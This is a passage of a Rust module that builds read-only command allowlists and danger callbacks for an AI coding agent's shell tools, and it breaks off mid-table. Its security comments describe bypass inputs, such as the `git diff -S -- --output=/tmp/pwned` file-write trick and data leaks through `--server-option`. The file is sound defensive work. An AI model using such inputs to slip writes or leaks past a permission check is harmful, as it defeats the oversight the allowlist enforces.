//! read_only_command_validation.rs — 共享的只读命令校验表。
//!
//! 重写自 `src/utils/shell/readOnlyCommandValidation.ts`。导出各 shell 工具
//! （BashTool、PowerShellTool 等）共用的完整命令配置表：
//! - `GIT_READ_ONLY_COMMANDS`：全部 git 子命令 + 安全 flag + 回调
//! - `GH_READ_ONLY_COMMANDS`：ant-only gh CLI 命令（依赖网络）
//! - `DOCKER_READ_ONLY_COMMANDS` / `RIPGREP_READ_ONLY_COMMANDS` /
//!   `PYRIGHT_READ_ONLY_COMMANDS`
//! - `EXTERNAL_READONLY_COMMANDS`：跨 shell（bash + PowerShell）通用的命令名
//! - `contains_vulnerable_unc_path`：UNC 路径检测（防凭据泄漏）
//! - `validate_flags`：flag 行走校验循环
//!
//! 对齐说明：TS 中唯一的平台依赖是 `getPlatform() === 'windows'`（仅用于
//! `contains_vulnerable_unc_path`）。platform.ts 尚未转 Rust，此处用
//! `std::env::consts::OS == "windows"` 等价替换——platform.ts 中只有
//! `process.platform === 'win32'` 映射到 'windows'，与 `consts::OS == "windows"`
//! 完全等价；platform.rs 落地后应统一改回 `crate::utils::platform`。

use std::collections::HashMap;

use once_cell::sync::Lazy;
use regex::Regex;

// ---------------------------------------------------------------------------
// 类型
// ---------------------------------------------------------------------------

/// TS: `FlagArgType`。flag 参数类型。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FlagArgType {
    /// `'none'` — 无参数（--color, -n）
    None,
    /// `'number'` — 整数参数（--context=3）
    Number,
    /// `'string'` — 任意字符串参数（--relative=path）
    String,
    /// `'char'` — 单字符（分隔符）
    Char,
    /// `'{}'` — 仅字面量 "{}"
    BracesLiteral,
    /// `'EOF'` — 仅字面量 "EOF"
    Eof,
}

/// `additionalCommandIsDangerousCallback`：返回 true 表示危险，false 安全。
/// `args` 是命令名之后的 token 列表（例如 "git branch" 之后的部分）。
pub type DangerousCallback = fn(raw_command: &str, args: &[String]) -> bool;

/// TS: `ExternalCommandConfig`。
#[derive(Debug, Clone)]
pub struct ExternalCommandConfig {
    pub safe_flags: &'static [(&'static str, FlagArgType)],
    /// 返回 true 表示命令危险。缺省 = 无回调。
    pub additional_command_is_dangerous_callback: Option<DangerousCallback>,
    /// 为 false 时，工具不遵循 POSIX `--` end-of-options 语义，
    /// `validate_flags` 在 `--` 之后继续校验 flag。缺省 true。
    pub respects_double_dash: bool,
}

impl ExternalCommandConfig {
    const fn flags(safe_flags: &'static [(&'static str, FlagArgType)]) -> Self {
        Self {
            safe_flags,
            additional_command_is_dangerous_callback: None,
            respects_double_dash: true,
        }
    }

    const fn with_callback(mut self, callback: DangerousCallback) -> Self {
        self.additional_command_is_dangerous_callback = Some(callback);
        self
    }

    const fn no_double_dash(mut self) -> Self {
        self.respects_double_dash = false;
        self
    }

    /// 按 flag 名查参数类型（等价 TS 的 `safeFlags[flag]` 查表）。
    pub fn flag_arg_type(&self, flag: &str) -> Option<FlagArgType> {
        self.safe_flags
            .iter()
            .find(|(name, _)| *name == flag)
            .map(|(_, ty)| *ty)
    }
}

// ---------------------------------------------------------------------------
// 共享 git flag 组（TS 同名常量）
// ---------------------------------------------------------------------------

const GIT_REF_SELECTION_FLAGS: &[(&str, FlagArgType)] = &[
    ("--all", FlagArgType::None),
    ("--branches", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("--remotes", FlagArgType::None),
];

const GIT_DATE_FILTER_FLAGS: &[(&str, FlagArgType)] = &[
    ("--since", FlagArgType::String),
    ("--after", FlagArgType::String),
    ("--until", FlagArgType::String),
    ("--before", FlagArgType::String),
];

const GIT_LOG_DISPLAY_FLAGS: &[(&str, FlagArgType)] = &[
    ("--oneline", FlagArgType::None),
    ("--graph", FlagArgType::None),
    ("--decorate", FlagArgType::None),
    ("--no-decorate", FlagArgType::None),
    ("--date", FlagArgType::String),
    ("--relative-date", FlagArgType::None),
];

const GIT_COUNT_FLAGS: &[(&str, FlagArgType)] = &[
    ("--max-count", FlagArgType::Number),
    ("-n", FlagArgType::Number),
];

// Stat 输出 flag — 用于 git log, show, diff
const GIT_STAT_FLAGS: &[(&str, FlagArgType)] = &[
    ("--stat", FlagArgType::None),
    ("--numstat", FlagArgType::None),
    ("--shortstat", FlagArgType::None),
    ("--name-only", FlagArgType::None),
    ("--name-status", FlagArgType::None),
];

// 颜色输出 flag — 用于 git log, show, diff
const GIT_COLOR_FLAGS: &[(&str, FlagArgType)] = &[
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
];

// Patch 显示 flag — 用于 git log, show
const GIT_PATCH_FLAGS: &[(&str, FlagArgType)] = &[
    ("--patch", FlagArgType::None),
    ("-p", FlagArgType::None),
    ("--no-patch", FlagArgType::None),
    ("--no-ext-diff", FlagArgType::None),
    ("-s", FlagArgType::None),
];

// 作者/提交者过滤 flag — 用于 git log, reflog
const GIT_AUTHOR_FILTER_FLAGS: &[(&str, FlagArgType)] = &[
    ("--author", FlagArgType::String),
    ("--committer", FlagArgType::String),
    ("--grep", FlagArgType::String),
];

// ---------------------------------------------------------------------------
// GIT_READ_ONLY_COMMANDS — 全部 git 子命令的完整映射
// 注意（对齐 TS 注释）：'git remote show' 必须排在 'git remote' 之前，
// 消费方按「最长 key 优先」匹配。
// ---------------------------------------------------------------------------

/// SECURITY: `git reflog expire`（位置式子命令）会写入 .git/logs/**，
/// `git reflog delete` 同样写入。只有裸 `git reflog`（= show）与
/// `git reflog show` 安全。位置式参数兜底逻辑原本会接受 `expire`，
/// 且 `--all` 在 GIT_REF_SELECTION_FLAGS 中 → 会误判通过。
fn git_reflog_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // 已知会写入的子命令：expire, delete, exists。
    // 允许：`show`、ref 名（HEAD, refs/*, 分支名）。
    // 子命令（若有）是第一个位置参数；show 或 flag 之后的都是 ref 名（安全）。
    const DANGEROUS_SUBCOMMANDS: &[&str] = &["expire", "delete", "exists"];
    for token in args {
        if token.is_empty() || token.starts_with('-') {
            continue;
        }
        // 第一个非 flag 位置参数：检查是否为危险子命令。
        // 若是 `show` 或 ref 名（HEAD/refs/...）则安全。
        if DANGEROUS_SUBCOMMANDS.contains(&token.as_str()) {
            return true; // 危险子命令 — 写入 .git/logs/**
        }
        // 第一个位置参数安全（show/HEAD/ref）— 后续都是 ref 参数
        return false;
    }
    false // 无位置参数 = 裸 `git reflog` = 安全
}

/// 只允许可选的 -n，之后恰好一个字母数字 remote 名。
fn git_remote_show_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // 过滤掉已知安全 flag
    let positional: Vec<&str> = args.iter().map(|a| a.as_str()).filter(|a| *a != "-n").collect();
    // 必须恰好一个看起来像 remote 名的位置参数
    if positional.len() != 1 {
        return true;
    }
    let name = positional[0];
    !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        || name.is_empty()
}

/// 只允许裸 'git remote' 或 'git remote -v/--verbose'。
fn git_remote_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // 所有参数必须是已知安全 flag；不允许位置参数
    args.iter().any(|a| a != "-v" && a != "--verbose")
}

/// SECURITY: 通过位置参数创建 tag。`git tag foo` 会写入 .git/refs/tags/foo
/// （41 字节文件）— 不是只读。与下方 `git branch` 的回调语义相同。
/// 没有此回调时，validateFlags 的位置参数兜底会接受 `mytag`，
/// 而 git tag 会自动批准。虽然写入受限（路径限于 .git/refs/tags/，
/// 内容固定为 HEAD SHA），但违反只读不变量。
fn git_tag_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // 安全用法：`git tag`（列出）、`git tag -l pattern`（过滤列出）、
    // `git tag --contains <ref>`（列出包含的）。不带 -l/--list 的裸位置参数
    // 是要创建的 tag 名 — 危险。
    const FLAGS_WITH_ARGS: &[&str] = &[
        "--contains",
        "--no-contains",
        "--merged",
        "--no-merged",
        "--points-at",
        "--sort",
        "--format",
        "-n",
    ];
    let mut i = 0usize;
    let mut seen_list_flag = false;
    let mut seen_dash_dash = false;
    while i < args.len() {
        let token = args[i].as_str();
        if token.is_empty() {
            i += 1;
            continue;
        }
        // `--` 结束 flag 解析。其后的 token 全是位置参数，
        // 即使以 `-` 开头。`git tag -- -l` 会创建名为 `-l` 的 tag。
        if token == "--" && !seen_dash_dash {
            seen_dash_dash = true;
            i += 1;
            continue;
        }
        if !seen_dash_dash && token.starts_with('-') {
            // 检查 -l/--list（精确或捆绑形式）。`-li` 捆绑了 -l 与 -i —
            // 两者都是 'none' 类型。逐字符检查短 flag 捆绑。
            if token == "--list" || token == "-l" {
                seen_list_flag = true;
            } else if short_bundle_contains(token, 'l') {
                // 形如 -li, -il 的短 flag 捆绑，包含 'l'
                seen_list_flag = true;
            }
            if token.contains('=') {
                i += 1;
            } else if FLAGS_WITH_ARGS.contains(&token) {
                i += 2;
            } else {
                i += 1;
            }
        } else {
            // 非 flag 位置参数（或 `--` 之后的位置参数）。
            // 只有前面有 -l/--list 时安全（此时它是 pattern，不是 tag 名）。
            if !seen_list_flag {
                return true; // 无 --list 的位置参数 = 创建 tag
            }
            i += 1;
        }
    }
    false
}

/// 阻止通过位置参数创建分支（如 "git branch newbranch"）。
/// flag 校验由 safe_flags 处理；args 是 "git branch" 之后的 token。
fn git_branch_is_dangerous(_raw_command: &str, args: &[String]) -> bool {
    // 阻止创建分支："git branch <name>" 或 "git branch <name> <start-point>"
    // 安全用法仅有："git branch"（列出）、"git branch -flags"（带选项列出）、
    // "git branch --contains/--merged/etc <ref>"（过滤）
    // 需要参数的 flag
    const FLAGS_WITH_ARGS: &[&str] = &[
        "--contains",
        "--no-contains",
        "--points-at",
        "--sort",
        // --abbrev 已移除：git 不消费分离参数（PARSE_OPT_OPTARG）
    ];
    // 可选参数的 flag（不强制要求，但可以带一个）
    const FLAGS_WITH_OPTIONAL_ARGS: &[&str] = &["--merged", "--no-merged"];
    let mut i = 0usize;
    let mut last_flag = "";
    let mut seen_list_flag = false;
    let mut seen_dash_dash = false;
    while i < args.len() {
        let token = args[i].as_str();
        if token.is_empty() {
            i += 1;
            continue;
        }
        // `--` 结束 flag 解析。`git branch -- -l` 会创建名为 `-l` 的分支。
        if token == "--" && !seen_dash_dash {
            seen_dash_dash = true;
            last_flag = "";
            i += 1;
            continue;
        }
        if !seen_dash_dash && token.starts_with('-') {
            // 检查 -l/--list，含短 flag 捆绑（-li, -la 等）
            if token == "--list" || token == "-l" {
                seen_list_flag = true;
            } else if short_bundle_contains(token, 'l') {
                seen_list_flag = true;
            }
            if token.contains('=') {
                last_flag = token.split('=').next().unwrap_or("");
                i += 1;
            } else if FLAGS_WITH_ARGS.contains(&token) {
                last_flag = token;
                i += 2;
            } else {
                last_flag = token;
                i += 1;
            }
        } else {
            // 非 flag 参数（或 `--` 之后的位置参数）— 可能是：
            // 1. 分支名（危险 - 会创建分支）
            // 2. --list/-l 之后的 pattern（安全）
            // 3. --merged/--no-merged 之后的可选参数（安全）
            let last_flag_has_optional_arg = FLAGS_WITH_OPTIONAL_ARGS.contains(&last_flag);
            if !seen_list_flag && !last_flag_has_optional_arg {
                return true; // 无 --list 或过滤 flag 的位置参数 = 创建分支
            }
            i += 1;
        }
    }
    false
}

/// 短 flag 捆绑检测：token 形如 `-li`（首字符 `-`、第二字符非 `-`、
/// 长度 > 2、不含 `=`、去掉首字符后包含目标字符）。对齐 TS：
/// `token[0] === '-' && token[1] !== '-' && token.length > 2 &&
/// !token.includes('=') && token.slice(1).includes('l')`
fn short_bundle_contains(token: &str, target: char) -> bool {
    let mut chars = token.chars();
    if chars.next() != Some('-') {
        return false;
    }
    match chars.next() {
        Some(c) if c != '-' => {}
        _ => return false,
    }
    token.chars().count() > 2 && !token.contains('=') && token.chars().skip(1).any(|c| c == target)
}

const GIT_DIFF_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_STAT_FLAGS
    ("--stat", FlagArgType::None),
    ("--numstat", FlagArgType::None),
    ("--shortstat", FlagArgType::None),
    ("--name-only", FlagArgType::None),
    ("--name-status", FlagArgType::None),
    // GIT_COLOR_FLAGS
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    // 显示与比较 flag
    ("--dirstat", FlagArgType::None),
    ("--summary", FlagArgType::None),
    ("--patch-with-stat", FlagArgType::None),
    ("--word-diff", FlagArgType::None),
    ("--word-diff-regex", FlagArgType::String),
    ("--color-words", FlagArgType::None),
    ("--no-renames", FlagArgType::None),
    ("--no-ext-diff", FlagArgType::None),
    ("--check", FlagArgType::None),
    ("--ws-error-highlight", FlagArgType::String),
    ("--full-index", FlagArgType::None),
    ("--binary", FlagArgType::None),
    ("--abbrev", FlagArgType::Number),
    ("--break-rewrites", FlagArgType::None),
    ("--find-renames", FlagArgType::None),
    ("--find-copies", FlagArgType::None),
    ("--find-copies-harder", FlagArgType::None),
    ("--irreversible-delete", FlagArgType::None),
    ("--diff-algorithm", FlagArgType::String),
    ("--histogram", FlagArgType::None),
    ("--patience", FlagArgType::None),
    ("--minimal", FlagArgType::None),
    ("--ignore-space-at-eol", FlagArgType::None),
    ("--ignore-space-change", FlagArgType::None),
    ("--ignore-all-space", FlagArgType::None),
    ("--ignore-blank-lines", FlagArgType::None),
    ("--inter-hunk-context", FlagArgType::Number),
    ("--function-context", FlagArgType::None),
    ("--exit-code", FlagArgType::None),
    ("--quiet", FlagArgType::None),
    ("--cached", FlagArgType::None),
    ("--staged", FlagArgType::None),
    ("--pickaxe-regex", FlagArgType::None),
    ("--pickaxe-all", FlagArgType::None),
    ("--no-index", FlagArgType::None),
    ("--relative", FlagArgType::String),
    // Diff 过滤
    ("--diff-filter", FlagArgType::String),
    // 短 flag
    ("-p", FlagArgType::None),
    ("-u", FlagArgType::None),
    ("-s", FlagArgType::None),
    ("-M", FlagArgType::None),
    ("-C", FlagArgType::None),
    ("-B", FlagArgType::None),
    ("-D", FlagArgType::None),
    ("-l", FlagArgType::None),
    // SECURITY: -S/-G/-O 带【必需】字符串参数（pickaxe 搜索、pickaxe 正则、
    // orderfile）。此前误标 'none' 导致与 git 的解析器差异：
    // `git diff -S -- --output=/tmp/pwned` — 校验器把 -S 当无参 → 前进 1 个
    // token → 遇 `--` 中断 → --output 未被检查。git 则把 -S 的必需参数消费为
    // `--`（标准 getopt：必需参数选项无条件消费下一个 argv，先于顶层 `--`
    // 检查）→ 游标落在 --output=... → 解析为长选项 → 任意文件写入。
    // git log 配置正确地把 -S/-G 标为 'string'。
    ("-S", FlagArgType::String),
    ("-G", FlagArgType::String),
    ("-O", FlagArgType::String),
    ("-R", FlagArgType::None),
];

const GIT_LOG_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_LOG_DISPLAY_FLAGS
    ("--oneline", FlagArgType::None),
    ("--graph", FlagArgType::None),
    ("--decorate", FlagArgType::None),
    ("--no-decorate", FlagArgType::None),
    ("--date", FlagArgType::String),
    ("--relative-date", FlagArgType::None),
    // GIT_REF_SELECTION_FLAGS
    ("--all", FlagArgType::None),
    ("--branches", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("--remotes", FlagArgType::None),
    // GIT_DATE_FILTER_FLAGS
    ("--since", FlagArgType::String),
    ("--after", FlagArgType::String),
    ("--until", FlagArgType::String),
    ("--before", FlagArgType::String),
    // GIT_COUNT_FLAGS
    ("--max-count", FlagArgType::Number),
    ("-n", FlagArgType::Number),
    // GIT_STAT_FLAGS
    ("--stat", FlagArgType::None),
    ("--numstat", FlagArgType::None),
    ("--shortstat", FlagArgType::None),
    ("--name-only", FlagArgType::None),
    ("--name-status", FlagArgType::None),
    // GIT_COLOR_FLAGS
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    // GIT_PATCH_FLAGS
    ("--patch", FlagArgType::None),
    ("-p", FlagArgType::None),
    ("--no-patch", FlagArgType::None),
    ("--no-ext-diff", FlagArgType::None),
    ("-s", FlagArgType::None),
    // GIT_AUTHOR_FILTER_FLAGS
    ("--author", FlagArgType::String),
    ("--committer", FlagArgType::String),
    ("--grep", FlagArgType::String),
    // 额外显示 flag
    ("--abbrev-commit", FlagArgType::None),
    ("--full-history", FlagArgType::None),
    ("--dense", FlagArgType::None),
    ("--sparse", FlagArgType::None),
    ("--simplify-merges", FlagArgType::None),
    ("--ancestry-path", FlagArgType::None),
    ("--source", FlagArgType::None),
    ("--first-parent", FlagArgType::None),
    ("--merges", FlagArgType::None),
    ("--no-merges", FlagArgType::None),
    ("--reverse", FlagArgType::None),
    ("--walk-reflogs", FlagArgType::None),
    ("--skip", FlagArgType::Number),
    ("--max-age", FlagArgType::Number),
    ("--min-age", FlagArgType::Number),
    ("--no-min-parents", FlagArgType::None),
    ("--no-max-parents", FlagArgType::None),
    ("--follow", FlagArgType::None),
    // 提交遍历 flag
    ("--no-walk", FlagArgType::None),
    ("--left-right", FlagArgType::None),
    ("--cherry-mark", FlagArgType::None),
    ("--cherry-pick", FlagArgType::None),
    ("--boundary", FlagArgType::None),
    // 排序 flag
    ("--topo-order", FlagArgType::None),
    ("--date-order", FlagArgType::None),
    ("--author-date-order", FlagArgType::None),
    // 格式控制
    ("--pretty", FlagArgType::String),
    ("--format", FlagArgType::String),
    // Diff 过滤
    ("--diff-filter", FlagArgType::String),
    // Pickaxe 搜索（查找增删某字符串的提交）
    ("-S", FlagArgType::String),
    ("-G", FlagArgType::String),
    ("--pickaxe-regex", FlagArgType::None),
    ("--pickaxe-all", FlagArgType::None),
];

const GIT_SHOW_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_LOG_DISPLAY_FLAGS
    ("--oneline", FlagArgType::None),
    ("--graph", FlagArgType::None),
    ("--decorate", FlagArgType::None),
    ("--no-decorate", FlagArgType::None),
    ("--date", FlagArgType::String),
    ("--relative-date", FlagArgType::None),
    // GIT_STAT_FLAGS
    ("--stat", FlagArgType::None),
    ("--numstat", FlagArgType::None),
    ("--shortstat", FlagArgType::None),
    ("--name-only", FlagArgType::None),
    ("--name-status", FlagArgType::None),
    // GIT_COLOR_FLAGS
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    // GIT_PATCH_FLAGS
    ("--patch", FlagArgType::None),
    ("-p", FlagArgType::None),
    ("--no-patch", FlagArgType::None),
    ("--no-ext-diff", FlagArgType::None),
    ("-s", FlagArgType::None),
    // 额外显示 flag
    ("--abbrev-commit", FlagArgType::None),
    ("--word-diff", FlagArgType::None),
    ("--word-diff-regex", FlagArgType::String),
    ("--color-words", FlagArgType::None),
    ("--pretty", FlagArgType::String),
    ("--format", FlagArgType::String),
    ("--first-parent", FlagArgType::None),
    ("--raw", FlagArgType::None),
    // Diff 过滤
    ("--diff-filter", FlagArgType::String),
    // 短 flag
    ("-m", FlagArgType::None),
    ("--quiet", FlagArgType::None),
];

const GIT_SHORTLOG_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_REF_SELECTION_FLAGS
    ("--all", FlagArgType::None),
    ("--branches", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("--remotes", FlagArgType::None),
    // GIT_DATE_FILTER_FLAGS
    ("--since", FlagArgType::String),
    ("--after", FlagArgType::String),
    ("--until", FlagArgType::String),
    ("--before", FlagArgType::String),
    // 汇总选项
    ("-s", FlagArgType::None),
    ("--summary", FlagArgType::None),
    ("-n", FlagArgType::None),
    ("--numbered", FlagArgType::None),
    ("-e", FlagArgType::None),
    ("--email", FlagArgType::None),
    ("-c", FlagArgType::None),
    ("--committer", FlagArgType::None),
    // 分组
    ("--group", FlagArgType::String),
    // 格式化
    ("--format", FlagArgType::String),
    // 过滤
    ("--no-merges", FlagArgType::None),
    ("--author", FlagArgType::String),
];

const GIT_REFLOG_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_LOG_DISPLAY_FLAGS
    ("--oneline", FlagArgType::None),
    ("--graph", FlagArgType::None),
    ("--decorate", FlagArgType::None),
    ("--no-decorate", FlagArgType::None),
    ("--date", FlagArgType::String),
    ("--relative-date", FlagArgType::None),
    // GIT_REF_SELECTION_FLAGS
    ("--all", FlagArgType::None),
    ("--branches", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("--remotes", FlagArgType::None),
    // GIT_DATE_FILTER_FLAGS
    ("--since", FlagArgType::String),
    ("--after", FlagArgType::String),
    ("--until", FlagArgType::String),
    ("--before", FlagArgType::String),
    // GIT_COUNT_FLAGS
    ("--max-count", FlagArgType::Number),
    ("-n", FlagArgType::Number),
    // GIT_AUTHOR_FILTER_FLAGS
    ("--author", FlagArgType::String),
    ("--committer", FlagArgType::String),
    ("--grep", FlagArgType::String),
];

const GIT_STASH_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_LOG_DISPLAY_FLAGS
    ("--oneline", FlagArgType::None),
    ("--graph", FlagArgType::None),
    ("--decorate", FlagArgType::None),
    ("--no-decorate", FlagArgType::None),
    ("--date", FlagArgType::String),
    ("--relative-date", FlagArgType::None),
    // GIT_REF_SELECTION_FLAGS
    ("--all", FlagArgType::None),
    ("--branches", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("--remotes", FlagArgType::None),
    // GIT_COUNT_FLAGS
    ("--max-count", FlagArgType::Number),
    ("-n", FlagArgType::Number),
];

const GIT_LS_REMOTE_FLAGS: &[(&str, FlagArgType)] = &[
    // 分支/tag 过滤 flag
    ("--branches", FlagArgType::None),
    ("-b", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("-t", FlagArgType::None),
    ("--heads", FlagArgType::None),
    ("-h", FlagArgType::None),
    ("--refs", FlagArgType::None),
    // 输出控制 flag
    ("--quiet", FlagArgType::None),
    ("-q", FlagArgType::None),
    ("--exit-code", FlagArgType::None),
    ("--get-url", FlagArgType::None),
    ("--symref", FlagArgType::None),
    // 排序 flag
    ("--sort", FlagArgType::String),
    // 协议 flag
    // SECURITY: --server-option 与 -o 被【故意排除】。它们把攻击者可控的
    // 任意字符串通过 protocol v2 capability advertisement 发给远端 git
    // 服务器。这是本应只读命令上的网络【写】原语。即使没有命令替换
    // （别处已拦截），`--server-option="sensitive-data"` 也会把值
    // 泄漏给 origin 指向的任何主机。只读路径绝不应开放网络写入。
];

const GIT_STATUS_FLAGS: &[(&str, FlagArgType)] = &[
    // 输出格式 flag
    ("--short", FlagArgType::None),
    ("-s", FlagArgType::None),
    ("--branch", FlagArgType::None),
    ("-b", FlagArgType::None),
    ("--porcelain", FlagArgType::None),
    ("--long", FlagArgType::None),
    ("--verbose", FlagArgType::None),
    ("-v", FlagArgType::None),
    // untracked 文件处理
    ("--untracked-files", FlagArgType::String),
    ("-u", FlagArgType::String),
    // 忽略选项
    ("--ignored", FlagArgType::None),
    ("--ignore-submodules", FlagArgType::String),
    // 分列显示
    ("--column", FlagArgType::None),
    ("--no-column", FlagArgType::None),
    // 领先/落后信息
    ("--ahead-behind", FlagArgType::None),
    ("--no-ahead-behind", FlagArgType::None),
    // 重命名检测
    ("--renames", FlagArgType::None),
    ("--no-renames", FlagArgType::None),
    ("--find-renames", FlagArgType::String),
    ("-M", FlagArgType::String),
];

const GIT_BLAME_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_COLOR_FLAGS
    ("--color", FlagArgType::None),
    ("--no-color", FlagArgType::None),
    // 行范围
    ("-L", FlagArgType::String),
    // 输出格式
    ("--porcelain", FlagArgType::None),
    ("-p", FlagArgType::None),
    ("--line-porcelain", FlagArgType::None),
    ("--incremental", FlagArgType::None),
    ("--root", FlagArgType::None),
    ("--show-stats", FlagArgType::None),
    ("--show-name", FlagArgType::None),
    ("--show-number", FlagArgType::None),
    ("-n", FlagArgType::None),
    ("--show-email", FlagArgType::None),
    ("-e", FlagArgType::None),
    ("-f", FlagArgType::None),
    // 日期格式化
    ("--date", FlagArgType::String),
    // 忽略空白
    ("-w", FlagArgType::None),
    // 忽略修订
    ("--ignore-rev", FlagArgType::String),
    ("--ignore-revs-file", FlagArgType::String),
    // 移动/复制检测
    ("-M", FlagArgType::None),
    ("-C", FlagArgType::None),
    ("--score-debug", FlagArgType::None),
    // 缩写
    ("--abbrev", FlagArgType::Number),
    // 其他选项
    ("-s", FlagArgType::None),
    ("-l", FlagArgType::None),
    ("-t", FlagArgType::None),
];

const GIT_LS_FILES_FLAGS: &[(&str, FlagArgType)] = &[
    // 文件选择
    ("--cached", FlagArgType::None),
    ("-c", FlagArgType::None),
    ("--deleted", FlagArgType::None),
    ("-d", FlagArgType::None),
    ("--modified", FlagArgType::None),
    ("-m", FlagArgType::None),
    ("--others", FlagArgType::None),
    ("-o", FlagArgType::None),
    ("--ignored", FlagArgType::None),
    ("-i", FlagArgType::None),
    ("--stage", FlagArgType::None),
    ("-s", FlagArgType::None),
    ("--killed", FlagArgType::None),
    ("-k", FlagArgType::None),
    ("--unmerged", FlagArgType::None),
    ("-u", FlagArgType::None),
    // 输出格式
    ("--directory", FlagArgType::None),
    ("--no-empty-directory", FlagArgType::None),
    ("--eol", FlagArgType::None),
    ("--full-name", FlagArgType::None),
    ("--abbrev", FlagArgType::Number),
    ("--debug", FlagArgType::None),
    ("-z", FlagArgType::None),
    ("-t", FlagArgType::None),
    ("-v", FlagArgType::None),
    ("-f", FlagArgType::None),
    // exclude pattern
    ("--exclude", FlagArgType::String),
    ("-x", FlagArgType::String),
    ("--exclude-from", FlagArgType::String),
    ("-X", FlagArgType::String),
    ("--exclude-per-directory", FlagArgType::String),
    ("--exclude-standard", FlagArgType::None),
    // 错误处理
    ("--error-unmatch", FlagArgType::None),
    // 递归
    ("--recurse-submodules", FlagArgType::None),
];

const GIT_CONFIG_GET_FLAGS: &[(&str, FlagArgType)] = &[
    // 无需额外 flag — 仅读取配置值
    ("--local", FlagArgType::None),
    ("--global", FlagArgType::None),
    ("--system", FlagArgType::None),
    ("--worktree", FlagArgType::None),
    ("--default", FlagArgType::String),
    ("--type", FlagArgType::String),
    ("--bool", FlagArgType::None),
    ("--int", FlagArgType::None),
    ("--bool-or-int", FlagArgType::None),
    ("--path", FlagArgType::None),
    ("--expiry-date", FlagArgType::None),
    ("-z", FlagArgType::None),
    ("--null", FlagArgType::None),
    ("--name-only", FlagArgType::None),
    ("--show-origin", FlagArgType::None),
    ("--show-scope", FlagArgType::None),
];

const GIT_MERGE_BASE_FLAGS: &[(&str, FlagArgType)] = &[
    ("--is-ancestor", FlagArgType::None), // 检查第一个提交是否为第二个的祖先
    ("--fork-point", FlagArgType::None),  // 查找分叉点
    ("--octopus", FlagArgType::None),     // 为多个 ref 找最佳共同祖先
    ("--independent", FlagArgType::None), // 过滤独立 ref
    ("--all", FlagArgType::None),         // 输出全部 merge base
];

const GIT_REV_PARSE_FLAGS: &[(&str, FlagArgType)] = &[
    // SHA 解析与校验
    ("--verify", FlagArgType::None), // 校验恰好一个参数是合法对象名
    ("--short", FlagArgType::String), // 缩写输出（可选长度经 =N 给出）
    ("--abbrev-ref", FlagArgType::None), // ref 的符号名
    ("--symbolic", FlagArgType::None), // 输出符号名
    ("--symbolic-full-name", FlagArgType::None), // 含 refs/heads/ 前缀的完整符号名
    // 仓库路径查询（全部只读）
    ("--show-toplevel", FlagArgType::None), // 顶层目录绝对路径
    ("--show-cdup", FlagArgType::None), // 到顶层需向上遍历的路径分量
    ("--show-prefix", FlagArgType::None), // 顶层到 cwd 的相对路径
    ("--git-dir", FlagArgType::None), // .git 目录路径
    ("--git-common-dir", FlagArgType::None), // 公共目录路径（主 worktree 的 .git）
    ("--absolute-git-dir", FlagArgType::None), // .git 目录的绝对路径
    ("--show-superproject-working-tree", FlagArgType::None), // 父工程根（若是子模块）
    // 布尔查询
    ("--is-inside-work-tree", FlagArgType::None),
    ("--is-inside-git-dir", FlagArgType::None),
    ("--is-bare-repository", FlagArgType::None),
    ("--is-shallow-repository", FlagArgType::None),
    ("--is-shallow-update", FlagArgType::None),
    ("--path-prefix", FlagArgType::None),
];

const GIT_REV_LIST_FLAGS: &[(&str, FlagArgType)] = &[
    // GIT_REF_SELECTION_FLAGS
    ("--all", FlagArgType::None),
    ("--branches", FlagArgType::None),
    ("--tags", FlagArgType::None),
    ("--remotes", FlagArgType::None),
    // GIT_DATE_FILTER_FLAGS
    ("--since", FlagArgType::String),
    ("--after", FlagArgType::String),
    ("--until", FlagArgType::String),
    ("--before", FlagArgType::String),
    // GIT_COUNT_FLAGS
    ("--max-count", FlagArgType::Number),
    ("-n", FlagArgType::Number),
    // GIT_AUTHOR_FILTER_FLAGS
    ("--author", FlagArgType::String),
    ("--committer", FlagArgType::String),
    ("--grep", FlagArgType::String),
    // 计数
    ("--count", FlagArgType::None),
    // 遍历控制
    ("--reverse", FlagArgType::None),
    ("--first-parent", FlagArgType::None),
    ("--ancestry-path", FlagArgType::None),
    ("--merges", FlagArgType::None),
    ("--no-merges", FlagArgType::None),
    ("--min-parents", FlagArgType::Number),
    ("--max-parents", FlagArgType::Number),
    ("--no-min-parents", FlagArgType::None),
    ("--no-max-parents", FlagArgType::None),
    ("--skip", FlagArgType::Number),
    ("--max-age", FlagArgType::Number),
    ("--min-age", FlagArgType::Number),
    ("--walk-reflogs", FlagArgType::None),
    // 输出格式化
    ("--oneline", FlagArgType::None),
    ("--abbrev-commit", FlagArgType::None),
    ("--pretty", FlagArgType::String),
    ("--format", FlagArgType::String),
    ("--abbrev", FlagArgType::Number),
    ("--full-history", FlagArgType::None),
    ("--dense", FlagArgType::None),
    ("--sparse", FlagArgType::None),
    ("--source", FlagArgType::None),
    ("--graph", FlagArgType::None),
];

const GIT_DESCRIBE_FLAGS: &[(&str, FlagArgType)] = &[
    // tag 选择
    ("--tags", FlagArgType::None), // 考虑全部 tag，不仅是 annotated
    ("--match", FlagArgType::String),  // 只考虑匹配 glob 的 tag
    ("--exclude", FlagArgType::String), // 不考虑匹配 glob 的 tag
    // 输出控制
